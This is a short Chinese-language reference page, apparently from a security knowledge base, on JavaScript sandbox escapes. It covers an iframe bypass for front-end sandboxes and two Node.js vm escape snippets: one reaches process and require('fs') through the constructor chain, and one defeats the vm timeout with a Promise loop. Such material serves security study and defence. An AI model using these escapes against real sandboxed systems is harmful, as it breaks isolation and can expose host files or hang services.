沙箱逃逸
========================================

前端沙箱
----------------------------------------
在前端中，可能会使用删除 ``eval`` ，重写 ``Function.prototype.constructor`` / ``GeneratorFunction`` / ``AsyncFunction`` 等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新iframe的方式来获取新的执行环境。

服务端沙箱
----------------------------------------
JavaScript服务端通常会使用 ``vm`` 作为沙箱，在旧版的沙箱中，有以下几种逃逸方式。

.. code-block:: javascript

    const sandbox = {};
    const whatIsThis = vm.runInNewContext(`
        const ForeignObject = this.constructor;
        const ForeignFunction = ForeignObject.constructor;
        const process = ForeignFunction("return process")();
        const require = process.mainModule.require;
        require("fs");
    `, sandbox);

.. code-block:: javascript

    vm.runInNewContext(
      'Promise.resolve().then(()=>{while(1)console.log("foo", Date.now());}); while(1)console.log(Date.now())',
      {console:{log(){console.log.apply(console,arguments);}}},
      {timeout:5}
    );
